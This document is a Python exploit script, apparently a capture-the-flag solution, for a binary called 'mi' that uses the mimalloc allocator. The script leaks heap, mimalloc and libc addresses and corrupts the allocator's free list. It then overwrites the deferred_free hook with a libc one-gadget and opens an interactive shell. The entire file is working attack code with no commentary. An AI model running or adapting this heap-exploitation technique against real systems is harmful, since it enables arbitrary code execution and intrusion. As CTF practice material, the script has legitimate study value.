#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './mi'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'env':{'LD_LIBRARY_PATH':'.'}, 'aslr':False}, \
                        local   = {'argv':[bin_file], 'env':{'LD_LIBRARY_PATH':'.'}}, \
                        remote  = {'host':'localhost', 'port':4444})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = None)
env.select()

#==========

binf = ELF(bin_file)

libmi = ELF('libmimalloc.so')
offset_mi_heap_main     = libmi.symbols['_mi_heap_main']
offset_mi_to_libc       = 0x22a000

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_onegadget   = 0x10a38c

#==========

def attack(conn, **kwargs):
    mi = Mi(conn)

    mi.create(0, 0x20)
    addr_heap_base = u(mi.read(0)[0x20:]) - 0x16c0
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    for _ in range(0x7f):
        mi.create(1, 0x20)
    mi.delete(1)

    mi.write(1, p64(addr_heap_base + 0x88).ljust(0x20))
    mi.create(1, 0x20)
    mi.create(1, 0x20)

    addr_mi_heap_main = u(mi.read(1)[0x20:])
    libmi.address = addr_mi_heap_main - offset_mi_heap_main
    info('addr_mi_base      = 0x{:08x}'.format(libmi.address))
    addr_mi_deferred_free   = libmi.symbols["deferred_free"]

    libc.address = libmi.address + offset_mi_to_libc
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_onegadget     = libc.address + offset_libc_onegadget

    mi.write(0, (p64(addr_heap_base + 0x1688) + p64(addr_mi_deferred_free)).ljust(0x20))
    mi.write(1, p64(addr_libc_onegadget) + p64(3) + p64(addr_heap_base + 0x1680) + p64(0x20))

    mi.create(0, 0x20)
    mi.write(0, '\x00'*0x20)

    mi.create(0, 0)

class Mi:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def create(self, n, size):
        self.sendlineafter('>>\n', '1')
        self.sendlineafter('number\n', str(n))
        self.sendlineafter('size\n', str(size))

    def write(self, n, value):
        self.sendlineafter('>>\n', '2')
        self.sendlineafter('number\n', str(n))
        self.sendafter('value\n', value)

    def read(self, n):
        self.sendlineafter('>>\n', '3')
        self.sendlineafter('number\n', str(n))
        return self.recvuntil('\n1.', drop=True)

    def delete(self, n):
        self.sendlineafter('>>\n', '4')
        self.sendlineafter('number\n', str(n))

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()

#==========
